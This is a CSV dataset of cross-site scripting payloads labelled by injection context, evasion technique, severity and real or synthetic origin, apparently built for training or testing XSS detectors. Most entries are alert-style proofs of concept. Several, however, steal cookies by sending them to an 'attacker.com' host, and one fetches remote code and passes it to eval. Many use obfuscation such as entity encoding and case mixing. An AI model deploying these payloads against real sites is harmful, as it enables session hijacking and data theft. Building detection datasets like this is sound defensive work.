payload,context,technique,severity,length,source
"<style onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</style>",tag_injection,none,medium,72,real
"<pre draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</pre>",tag_injection,none,medium,64,real
"%27 ><svg onselect=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"<plaintext onmouseup=""alert(1)"">AnonKryptiQuz</plaintext>",tag_injection,none,medium,57,real
"<tt oncut=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",tag_injection,none,medium,55,real
"""%3E%3Cimg src=x ontouchstart=console.log(1)%3E",attribute_escape,synthetic,medium,47,synthetic
' ><svG oNblUr=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,44,synthetic
javascr	ipt:void(prompt('XSS')),js_uri,synthetic,medium,31,synthetic
<colgroup onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</colgroup><input value=clickme>,tag_injection,none,medium,107,real
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable style=display:block>drop here</main>",tag_injection,none,medium,125,real
"__proto__[""onclick""]=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink,synthetic,high,106,synthetic
"<address onmouseup=""alert(1)"">AnonKryptiQuz</address>",tag_injection,none,medium,53,real
%22 oncopy=console.log(location.hash) %22,attribute_escape,synthetic,medium,41,synthetic
"""><img src=x ontouchst&#97;rt=confirm('XSS')>",attribute_escape,synthetic,medium,45,synthetic
%3Cxmp/ontransitionend=alert(location.hash)%3E,tag_injection,synthetic,medium,46,synthetic
<img src/onerror=prompt(8)>,tag_injection,none,medium,27,real
	onanimationend=console.log('XSS'),event_handler,synthetic,medium,34,synthetic
onscrollend=console.log&#40;location.hash&#41;,event_handler,synthetic,low,46,synthetic
<em onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</em><input value=clickme>,tag_injection,none,medium,104,real
<button popovertarget=x>Click me</button><form ontoggle=alert(1) popover id=x>AnonKryptiQuz</form>,tag_injection,none,medium,98,real
" onMozFulLscReeNchAngE=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,60,synthetic
<a src=x onsearch=\u0061lert(1)>,tag_injection,synthetic,low,32,synthetic
<auDio	onInpUt=ProMpt(loCatIon.haSh)>,tag_injection,synthetic,medium,37,synthetic
"<svg/onload='fetch(""//host/a"").then(r=>r.text().then(t=>eval(t)))'>",dom_sink,encoding,high,67,real
`%3E%3Cimg src=x onpointerrawupdate=alert(location.hash)%3E,attribute_escape,synthetic,medium,59,synthetic
"onpagereveal=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,51,synthetic
"<anImaTemOtiOn
OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS')>",tag_injection,synthetic,medium,55,synthetic
"""`'><script>\x00javascript:alert(5358)</script>",script_injection,none,medium,47,real
"document.write(""%3Cimg src=x onerror=fetch('//attacker.com/?c='+document.cookie)%3E"")",dom_sink,synthetic,high,85,synthetic
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",tag_injection,none,medium,82,real
<tr/onTogGle=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,42,synthetic
location.href=%22javascript:prompt(location.hash)%22,dom_sink,synthetic,high,52,synthetic
<image onpointerdown=alert(1) style=display:block>AnonKryptiQuz</image>,tag_injection,none,medium,71,real
"<optgroup onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</optgroup>",tag_injection,none,medium,89,real
%E5%98%8D%E5%98%8A%20<script>alert(1)</script>,script_injection,url_encoding,medium,46,real
"<xsS
oNanImaTioNstArt=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,61,synthetic
"<blockquote onclick=""alert(1)"">AnonKryptiQuz</blockquote>",tag_injection,none,medium,57,real
<!--><b&#97;s&#101; oninput=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,50,synthetic
"(new Function(""prompt(document.cookie)""))();",dom_sink,synthetic,high,44,synthetic
%3Cmath oninvalid=confirm('XSS')%3E,tag_injection,synthetic,medium,35,synthetic
""" onmouseup=prompt(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,51,synthetic
"ondblclick=prompt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,62,synthetic
' ><svG oNplAy=ConFirM(1)>,attribute_escape,synthetic,medium,26,synthetic
/<script>alert(1234)</script>,script_injection,none,medium,29,real
\' onpoint&#101;rmov&#101;=confirm(docum&#101;nt.dom&#97;in)//,attribute_escape,synthetic,medium,62,synthetic
`><img src=x onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,82,synthetic
onrepeat=alert&#40;'XSS'&#41;,event_handler,synthetic,low,29,synthetic
"EvaL(""XMLHttPReQueSt(BtoA(dOcuMenT.cOokIe))"")",dom_sink,synthetic,high,45,synthetic
${&#97;l&#101;rt?n&#101;w()('docum&#101;nt.cooki&#101;')},template_injection,synthetic,low,57,synthetic
"<span
onsecuritypolicyviolation=alert(location.hash)>",tag_injection,synthetic,medium,53,synthetic
"eval(%22alert(String.fromCharCode(88,83,83))%22)",dom_sink,synthetic,high,48,synthetic
<source onpointerenter=alert(1) style=display:block>AnonKryptiQuz</source>,tag_injection,none,medium,74,real
"<a @['c\lic\u{6b}']=""_c.constructor('alert(1)')()"">AnonKryptiQuz</a>",attribute_escape,none,medium,68,real
<set	onwebkitfullscreenchange=console.log('XSS')>,tag_injection,synthetic,medium,49,synthetic
<ruby onpointermove=alert(1) style=display:block>AnonKryptiQuz</ruby>,tag_injection,none,medium,69,real
"<area oncontextmenu=""alert(1)"">AnonKryptiQuz</area>",tag_injection,none,medium,51,real
""" ><svG oNtoUchMovE=pRomPt(1)>",attribute_escape,synthetic,medium,30,synthetic
"""%3E%3Cimg src=x ontouchstart=confirm('XSS')%3E",attribute_escape,synthetic,medium,47,synthetic
<s&#101;l&#101;ct/on&#97;nim&#97;tionst&#97;rt=prompt('XSS')>,tag_injection,synthetic,medium,61,synthetic
"__proto__[""onpointercancel""]=confirm(location.hash)",dom_sink,synthetic,medium,51,synthetic
%3C!--%3E%3Ctr onselect=console.log(1)%3E,tag_injection,synthetic,medium,41,synthetic
""" oNtrAnsItiOneNd=ConFirM('XSS') """,attribute_escape,synthetic,medium,34,synthetic
"document.body.innerHTML=""<img src=x onerror=console.log(btoa(document.cookie))>""",dom_sink,synthetic,high,80,synthetic
OneRroR=cOnsOle.loG/**/('XSS'),event_handler,synthetic,low,30,synthetic
"document.write(""<img src=x onerror=eval(document.cookie)>"")",dom_sink,synthetic,high,59,synthetic
"""><img src=x ondrop=confirm(1)>",attribute_escape,synthetic,medium,31,synthetic
"<center onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</center>",tag_injection,none,medium,74,real
"javascr	ipt:console.log/**/(String.fromCharCode(88,83,83))",js_uri,synthetic,high,58,synthetic
onsecuritypolicyviolation=javascr	ipt:console.log(document.domain),event_handler,synthetic,medium,66,synthetic
"__pRotO__[""oNcoPy""]=eVal(StRinG.fRomChaRCoDe(88,83,83))",dom_sink,synthetic,high,55,synthetic
"<marquee onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",tag_injection,none,medium,70,real
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></header>",tag_injection,none,medium,172,real
"\"" ontouchend=\u0061lert('XSS')//",attribute_escape,synthetic,low,33,synthetic
"""%3E%3Carea onpageshow=prompt('XSS')%3E",tag_injection,synthetic,medium,39,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=fetch('XSS')%3E""",dom_sink,synthetic,high,62,synthetic
<script>window['alert'](1)</script>,script_injection,synthetic,low,35,synthetic
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",js_uri,none,medium,99,real
"\"" ongestureend=prompt(1)//",attribute_escape,synthetic,medium,27,synthetic
<tr onSelEct=coNsoLe.Log(1)>,tag_injection,synthetic,medium,28,synthetic
<a autofocus onfocusin=alert(1) href></a>,tag_injection,none,medium,41,real
<button popovertarget=x>Click me</button><u ontoggle=alert(1) popover id=x>AnonKryptiQuz</u>,tag_injection,none,medium,92,real
<form src=x ong&#101;stur&#101;st&#97;rt=consol&#101;.log('XSS')>,tag_injection,synthetic,low,65,synthetic
<&#97;udio x=y onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,62,synthetic
<script /**/>/**/alert(/AmoloHT/)/**/</script /**/,script_injection,comment_injection,medium,50,real
onkeyup=javascr	ipt:confirm(location.hash),event_handler,synthetic,medium,42,synthetic
<del onpointerup=alert(1) style=display:block>AnonKryptiQuz</del>,tag_injection,none,medium,65,real
"<IMG SRC=""javascript:alert(1034);"">",js_uri,case_variation,medium,35,real
"%22 ><svg onanimationcancel=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
""" ><svg ontoggl&#101;=consol&#101;.log(1)>",attribute_escape,synthetic,low,42,synthetic
OnmOusEup=coNfiRm&#40;doCumEnt.doMaiN&#41;,event_handler,synthetic,low,42,synthetic
<p onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,51,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=XMLHTtpReqUesT(lOcaTioN.hAsh)>""",dom_sink,synthetic,high,75,synthetic
&quot; onpopst&#97;t&#101;=&#97;l&#101;rt('XSS') x=&quot;,attribute_escape,synthetic,low,57,synthetic
"<xmp
onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,80,synthetic
""" ><svg ongesturestart=\u0061lert(1)>",attribute_escape,synthetic,low,37,synthetic
' onplay=confirm(document.domain) ',attribute_escape,synthetic,medium,35,synthetic
""" %3E%3Csvg onpromptdismiss=prompt(1)%3E",attribute_escape,synthetic,medium,40,synthetic
<!--><svg onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,64,synthetic
"<rtc onmouseout=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,46,real
"' ><svg onbegin=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
' %3E%3Csvg onmouseenter=alert(location.hash)%3E,attribute_escape,synthetic,medium,48,synthetic
""" %3E%3Csvg onhashchange=console.log(document.domain)%3E",attribute_escape,synthetic,medium,56,synthetic
"LocAtiOn=""jaVasCriPt:ConSolE.lOg(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)""",dom_sink,synthetic,high,72,synthetic
onkeydown=confirm/***/('XSS'),event_handler,synthetic,low,29,synthetic
"<style>@keyframes x{}</style><map style=""animation-name:x"" onwebkitanimationend=""alert(1)""></map>",tag_injection,none,medium,97,real
""" ><svg ongesturestart=prompt('XSS')>",attribute_escape,synthetic,medium,37,synthetic
"<track onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</track>",tag_injection,none,medium,63,real
<noscr	ipt x=y onpaste=confirm(location.hash)>,tag_injection,synthetic,medium,46,synthetic
%27 ><svg onpointerover=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,47,synthetic
"<listing onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",tag_injection,none,medium,75,real
 onmous&#101;ov&#101;r=consol&#101;.log(1),event_handler,synthetic,low,42,synthetic
"<div oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
__proto__[%22onauxclick%22]=prompt(location.hash),dom_sink,synthetic,medium,49,synthetic
"s&#101;tTim&#101;out(""prompt(loc&#97;tion.h&#97;sh)"",0)",dom_sink,synthetic,medium,55,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>"")",dom_sink,synthetic,low,128,synthetic
<svg><source onload=alert(1)></source>,tag_injection,none,medium,38,real
<button popovertarget=x>Click me</button><time onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</time>,tag_injection,none,medium,104,real
' ><svg onpoint&#101;rc&#97;nc&#101;l=prompt(1)>,attribute_escape,synthetic,medium,48,synthetic
"<br onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</br>",tag_injection,none,medium,63,real
""" ><svg onmous&#101;down=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,63,synthetic
"LocAtiOn.HreF=""JavAscRipT:eVal(doCumEnt.coOkiE)""",dom_sink,synthetic,high,48,synthetic
%3Ctd	onwebkitanimationend=prompt('XSS')%3E,tag_injection,synthetic,medium,43,synthetic
<scRipT x=y OnpOinTerRawUpdAte=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,60,synthetic
"<spacer onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</spacer>",tag_injection,none,medium,70,real
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,tag_injection,none,medium,66,real
""" onanimationend=alert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,55,synthetic
%22><noscript onbeforematch=console.log(%27XSS%27)>,tag_injection,synthetic,medium,51,synthetic
' %3E%3Csvg onload=console.log(1)%3E,attribute_escape,synthetic,medium,36,synthetic
"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",js_uri,case_variation,medium,62,real
\%22 onsearch=alert(1)//,attribute_escape,synthetic,medium,24,synthetic
"""><Img srC=x onBefOreTogGle=coNfiRm(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,51,synthetic
""" ><svg onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,78,synthetic
"<shadow draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</shadow>",tag_injection,none,medium,70,real
`%3E%3Cimg src=x onchange=console.log(1)%3E,attribute_escape,synthetic,medium,43,synthetic
(new Function(%22eval(location.hash)%22))();,dom_sink,synthetic,high,44,synthetic
	onbeforetoggle=prompt('XSS'),event_handler,synthetic,medium,29,synthetic
"\"" OneNd=ConFirM(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,49,synthetic
<script>window['prompt'](docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,low,59,synthetic
"%27 onanimationstart=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,61,synthetic
<audio2 onpointerout=alert(1) style=display:block>AnonKryptiQuz</audio2>,tag_injection,none,medium,72,real
"""><img src=x ontransitionend=\u0061lert(1)>",attribute_escape,synthetic,low,43,synthetic
"<img src=x onerror=""\u0061lert(1)""/>",tag_injection,unicode_escape,low,36,real
"<tbody draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",tag_injection,none,medium,88,real
%3Caudio x=y onpopstate=confirm(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
' %3E%3Csvg onpointerrawupdate=prompt('XSS')%3E,attribute_escape,synthetic,medium,47,synthetic
<!--><marquee onscrollsnapchange=prompt(1)>,tag_injection,synthetic,medium,43,synthetic
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",tag_injection,none,medium,97,real
"%22 ontouchstart=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,59,synthetic
"""%3E%3Cimg src=x onselect=confirm(location.hash)%3E",attribute_escape,synthetic,medium,51,synthetic
'><img src=x ongestureend=prompt(1)>,attribute_escape,synthetic,medium,36,synthetic
"<samp onclick=""alert(1)"">AnonKryptiQuz</samp>",tag_injection,none,medium,45,real
<!--><t&#101;xt&#97;r&#101;&#97; onscroll&#101;nd=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,72,synthetic
<command contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,61,real
"' oNanImaTioNcaNceL=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,64,synthetic
"&#101;v&#97;l(""XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"")",dom_sink,synthetic,high,102,synthetic
JavAscRipT:vOid(prOmpT('XSS')),js_uri,synthetic,medium,30,synthetic
"document.write(""%3Cimg src=x onerror=prompt(document.domain)%3E"")",dom_sink,synthetic,medium,65,synthetic
"<caption draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",tag_injection,none,medium,90,real
<SCRIPT>prompt(loc&#97;tion.h&#97;sh)</SCRIPT>,script_injection,synthetic,medium,46,synthetic
"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></col>",tag_injection,none,medium,110,real
\' ontouch&#101;nd=consol&#101;.log('XSS')//,attribute_escape,synthetic,low,44,synthetic
&quot; onlo&#97;d=consol&#101;.log(1) x=&quot;,attribute_escape,synthetic,low,46,synthetic
%27><img src=x ongestureend=console.log(location.hash)>,attribute_escape,synthetic,medium,55,synthetic
onk&#101;ypr&#101;ss=prompt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,61,synthetic
onfocusin=confirm/**/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,47,synthetic
<plaintext onpointermove=alert(1) style=display:block>AnonKryptiQuz</plaintext>,tag_injection,none,medium,79,real
&#106;AvaScrIpt:coNfiRm(DocUmeNt.DomAin),js_uri,synthetic,medium,40,synthetic
<scr	ipt>/x/confirm(1)</scr	ipt>,script_injection,synthetic,medium,32,synthetic
<p onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</p>,tag_injection,none,medium,68,real
<set onpointerout=alert(1) style=display:block>AnonKryptiQuz</set>,tag_injection,none,medium,66,real
<animatemotion/onwaiting=\u0061lert(location.hash)>,tag_injection,synthetic,low,51,synthetic
onch&#97;ng&#101;=confirm&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,56,synthetic
<input3 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
"__proto__[""oncontextmenu""]=confirm('XSS')",dom_sink,synthetic,medium,41,synthetic
<script>Function(%27confirm(document.domain)%27)();</script>,script_injection,synthetic,medium,60,synthetic
"\' onpromptdismiss=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,67,synthetic
' onsecuritypolicyviolation=console.log(document.domain) ',attribute_escape,synthetic,medium,58,synthetic
javascript:void(alert(document.domain)),js_uri,synthetic,medium,39,synthetic
""" %3E%3Csvg onpause=console.log('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
"""><Img srC=x onProMptDisMisS=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
"%3Ciframe x=y ongestureend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,72,synthetic
"<ins oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
OnpOpsTatE=cOnfIrm(1),event_handler,synthetic,medium,21,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""f&#101;tch(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink,synthetic,low,127,synthetic
